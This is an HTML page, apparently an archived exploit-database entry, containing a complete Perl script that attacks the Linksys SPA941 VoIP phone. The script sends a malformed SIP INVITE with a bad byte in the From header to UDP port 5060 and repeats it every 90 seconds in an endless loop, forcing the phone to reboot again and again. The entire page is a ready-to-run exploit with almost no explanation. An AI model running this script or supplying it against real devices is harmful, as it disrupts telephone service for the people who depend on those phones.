<html><head><title>Linksys SPA941 (remote reboot) Remote Denial of Service Exploit</title></head><pre>#!/usr/bin/perl

 

use IO::Socket;

 

#die &quot;Usage $0 &lt;username&gt; &lt;dst_IP&gt; &lt;Source_IP&gt; &lt;SourcePort&gt;&quot; unless ($ARGV[2]);

die &quot;Usage $0 &lt;username&gt; &lt;dst_IP&gt; &lt;SourceIp&gt; &lt;sourceport&gt;&quot; unless ($ARGV[0]);

 

my $sock = new IO::Socket::INET( LocalHost =&gt; $ARGV[2], LocalPort =&gt; $ARGV[3], Proto =&gt; 'udp');

$socket=new IO::Socket::INET-&gt;new(PeerAddr=&gt;$ARGV[1], PeerPort=&gt; '5060', Proto=&gt;'udp', LocalAddr=&gt;$ARGV[2], LocalPort=&gt;'5061');

 

$touser=$ARGV[0];

$target=$ARGV[1];

$sourceaddress=$ARGV[2];

$sourceport=$ARGV[3];

$high=2000;

$low=1;

$fromuserid = int(rand( $high-$low+1 ) ) + $low;

my $cseq = &quot;INVITE&quot;;

 

$msg = &quot;INVITE sip:$touser\@$target SIP/2.0\r

Via: SIP/2.0/UDP $sourceaddress:$sourceport;branch=z9hG4bK00000\r

From: \377&lt;sip:$fromuserid\@$sourceaddress&gt;;tag=779\r

To: Receiver &lt;sip:$touser\@$target&gt;\r

Call-ID: 10\@$sourceaddress\r

CSeq: 1 $cseq\r

Contact: 779 &lt;sip:$fromuserid\@$sourceaddress&gt;\r

Expires: 1200\r

Max-Forwards: 70\r

Content-Type: application/sdp\r

Content-Length: 133\r

\r

v=0\r

o=0 0 0 IN IP4 $sourceaddress\r

s=Session SDP\r

c=IN  IP4 $sourceaddress\r

t=0 0\r

m=audio 9876 RTP/AVP 0\r

a=rtpmap:0 PCMU/8000\r&quot;;

 

$sock or die &quot;no socket :$!&quot;;

while (1){

            $socket-&gt;send($msg);

            sleep 90;

            }

# milw0rm.com [2007-04-24]</pre></html>